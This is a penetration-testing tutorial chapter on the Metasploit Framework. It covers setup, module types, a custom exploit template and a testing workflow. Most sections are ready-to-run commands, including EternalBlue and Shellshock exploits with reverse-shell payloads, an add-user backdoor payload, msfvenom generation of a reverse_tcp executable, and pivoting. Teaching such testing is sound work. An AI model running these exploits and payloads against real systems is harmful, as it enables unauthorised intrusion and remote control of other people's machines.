5.1 Introduction to Metasploit

The Metasploit Framework is a powerful platform for developing, testing, and executing exploits against remote targets. It's widely used by cybersecurity professionals for penetration testing, vulnerability assessment, and security research.

5.2 Setting Up Metasploit

5.2.1 Installation

Kali Linux comes pre-installed with Metasploit. You can start Metasploit by simply typing:

msfconsole

First, ensure your system is up to date:

sudo apt-get update
sudo apt-get upgrade

Next, install Metasploit using the Rapid7 installer:

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

Download the Metasploit installer from the Rapid7 website and follow the installation instructions:

https://www.rapid7.com/products/metasploit/download/

5.2.2 Configuration

After installation, configure Metasploit to work efficiently within your environment:

Database Configuration

Metasploit uses PostgreSQL as its database. Start and initialize the database:

service postgresql start
msfdb init

Metasploit Configuration File

Modify the msfconsole configuration file to set various options:

~/.msf4/msfconsole.rc

Example configurations might include setting a default workspace or loading specific modules on startup:

# Set default workspace
workspace -a my_workspace
# Load a specific module on startup
use exploit/windows/smb/ms17_010_eternalblue

5.3 Using Metasploit

5.3.1 Basic Commands

  • msfconsole: Launch the Metasploit console. 
    msfconsole
  • search: Search for exploits, payloads, and auxiliary modules. 
    search type:exploit name:windows
  • use: Select a specific module to use. 
    use exploit/windows/smb/ms17_010_eternalblue
  • show options: Display the configurable options for a module. 
    show options
  • set: Set a specific option for a module. 
    set RHOST 192.168.1.20
    set LHOST 192.168.1.10
  • run or exploit: Execute the selected module. 
    run
    # or
    exploit

5.3.2 Module Types

Metasploit modules are the core components that perform specific tasks. Here’s a deeper look at the different types of modules:

Auxiliary Modules

Auxiliary modules are used for various tasks that don’t involve exploiting a target directly. These include scanning, fuzzing, and information gathering.

Example: Port Scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run
Example: SMB Version Detection
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.20
run

Exploit Modules

Exploit modules are used to take advantage of vulnerabilities in a system to execute arbitrary code.

Example: EternalBlue Exploit (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

Payloads

Payloads are the pieces of code that run on the target system after an exploit is successful. They can provide remote access, create backdoors, or execute specific commands.

Example: Reverse TCP Meterpreter Payload
use payload/windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
Example: Add User Payload
use payload/windows/adduser
set USER randomuser
set PASS Password123

5.3.3 Creating and Using Custom Modules

Creating custom modules in Metasploit allows you to tailor exploits, payloads, and auxiliary functions to specific needs. This flexibility is crucial for advanced penetration testing and research.

Steps to Create a Custom Module

  • Directory Structure: Custom modules are typically stored in the ~/.msf4/modules/ directory. Create subdirectories for different module types (e.g., exploits, auxiliary, payloads). 
    mkdir -p ~/.msf4/modules/exploits/custom
  • Module Template: Start with a template. Here’s a basic template for an exploit module: 
    class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Exploit',
      'Description'    => %q{
        This module exploits a custom vulnerability.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Your Name'],
      'References'     => [
        ['CVE', '2021-XXXX'],
        ['URL', '']
      ],
      'Payload'        => {
        'Space'    => 4000,
        'BadChars' => "\\x00\\x0a\\x0d",
      },
      'Platform'       => 'win',
      'Targets'        => [
        ['Windows', { 'Arch' => ARCH_X86 }]
      ],
      'DefaultOptions' => {
        'EXITFUNC' => 'process',
      },
      'DisclosureDate' => 'Jan 01 2021',
      'DefaultTarget'  => 0
    ))
  end

  def exploit
    connect
    sock.put(payload.encoded)
    handler
    disconnect
  end
end
  • Implementing the Module: Customize the module by defining the exploit method and other necessary methods. Ensure you handle connections, payload delivery, and cleanup.
  • Loading the Module: Load your custom module into Metasploit: 
    loadpath ~/.msf4/modules/
  • Using the Custom Module: Use the custom module like any other Metasploit module: 
    use exploit/custom/custom_exploit
    set RHOST 192.168.1.20
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.1.10
    exploit

5.4 Metasploit in a Penetration Testing Workflow

Metasploit is integral to a structured penetration testing workflow. Here’s how it fits into each phase:

Reconnaissance:

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

Scanning and Enumeration:

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.20
run

Exploitation:

use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

Post-Exploitation:

sessions -i 1
sysinfo

Reporting:

Document findings, exploited vulnerabilities, and recommendations for remediation.

5.5 Examples of Common Exploits

EternalBlue (MS17-010):

use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

Heartbleed (CVE-2014-0160):

use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.1.0/24
run

Shellshock (CVE-2014-6271):

use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST 192.168.1.20
set TARGETURI /cgi-bin/test.cgi
set PAYLOAD cmd/unix/reverse_perl
set LHOST 192.168.1.10
exploit

5.6 Advanced Metasploit Techniques

Post-Exploitation Modules:

use post/windows/gather/enum_logged_on_users
set SESSION 1
run

Pivoting:

run autoroute -s 192.168.2.0/24
portfwd add -l 3389 -p 3389 -r 192.168.2.10

Custom Payloads:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe

Resource Scripts:

Automate tasks using resource scripts.

# Example resource script (script.rc)
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit
msfconsole -r script.rc

Summary

The Metasploit Framework is a versatile and powerful tool for penetration testing, offering extensive capabilities for exploiting vulnerabilities, conducting post-exploitation activities, and automating tasks. By mastering Metasploit, you can significantly enhance your penetration testing skills and improve your ability to identify and mitigate security risks.
